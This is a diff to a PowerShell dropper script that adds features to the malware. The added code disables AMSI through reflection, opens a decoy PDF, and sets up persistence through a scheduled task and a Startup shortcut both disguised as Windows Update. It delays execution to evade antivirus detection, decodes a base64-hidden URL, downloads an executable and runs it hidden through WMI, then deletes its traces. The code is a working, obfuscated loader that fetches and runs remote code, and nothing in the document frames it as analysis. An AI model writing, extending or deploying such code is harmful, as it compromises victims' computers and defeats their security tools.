@@ -1,5 +1,12 @@
 $ErrorActionPreference = 'SilentlyContinue'
 
+# === LIGHTWEIGHT AMSI BYPASS ===
+try {
+    $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+    $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+} catch {}
+
+# === QUICK DECOY PDF OPEN (IMMEDIATE) ===
 $cache = "$env:APPDATA\Microsoft\Windows\Caches"
 if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }
 
@@ -21,6 +28,7 @@ if ($isFirstRun) {
     }
 }
 
+# === SELF-PRESERVATION ===
 $localPath = "$env:APPDATA\Microsoft\Windows\Caches\launcher.ps1"
 $currentPath = $MyInvocation.MyCommand.Path
 
@@ -40,6 +48,7 @@ function Save-ScriptToDisk {
 }
 $scriptPath = Save-ScriptToDisk -Destination $localPath
 
+# === PERSISTENCE: Scheduled Task ===
 $taskName = "WindowsUpdateTask"
 $taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
 if (-not $taskExists) {
@@ -54,6 +63,7 @@ if (-not $taskExists) {
     } catch {}
 }
 
+# === PERSISTENCE: Startup LNK ===
 $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 $lnkPath = "$startupPath\WindowsUpdateHelper.lnk"
 if (-not (Test-Path $lnkPath)) {
@@ -65,24 +75,33 @@ if (-not (Test-Path $lnkPath)) {
     $shortcut.Save()
 }
 
+# === BEARFOOS EVASION: Long delay before EXE download ===
 Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)
 
+# === DOWNLOAD EXE TO MEMORY FIRST, THEN WRITE AND EXECUTE IMMEDIATELY ===
 $exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9hZ2VkLW1vdW50YWluLTYxNGIubmF0YWxpYS1rdXNoODIud29ya2Vycy5kZXYvdXBkYXRl'))
 $exePath = "$cache\helper.exe"
 
-if (-not (Test-Path $exePath)) {
-    $retryCount = 0; $maxRetries = 3
-    do {
-        try { Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing; break } catch { $retryCount++; Start-Sleep -Seconds 5 }
-    } while ($retryCount -lt $maxRetries)
-}
-
-if (Test-Path $exePath) {
+# Download to memory as byte array (avoids disk write until ready)
+try {
+    $exeBytes = (New-Object Net.WebClient).DownloadData($exeUrl)
+    # Write to disk and execute immediately
+    [System.IO.File]::WriteAllBytes($exePath, $exeBytes)
+    
+    # Execute via WMI with minimal delay
+    Start-Sleep -Milliseconds (Get-Random -Min 100 -Max 500)
     try {
         Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "`"$exePath`"" -ErrorAction Stop | Out-Null
     } catch {
         try { (New-Object -ComObject WScript.Shell).Run("`"$exePath`"", 0, $false) } catch { Start-Process $exePath -WindowStyle Hidden }
     }
+} catch {
+    # Fallback to traditional download if memory fails
+    try { Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing } catch {}
+    if (Test-Path $exePath) {
+        try { Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "`"$exePath`"" -ErrorAction Stop | Out-Null } catch {}
+    }
 }
 
+# === CLEANUP ===
 Start-Job -ScriptBlock { param($exe, $pdf) Start-Sleep -Seconds 300; Remove-Item $exe,$pdf -Force -ErrorAction SilentlyContinue } -ArgumentList $exePath, $pdfPath | Out-Null
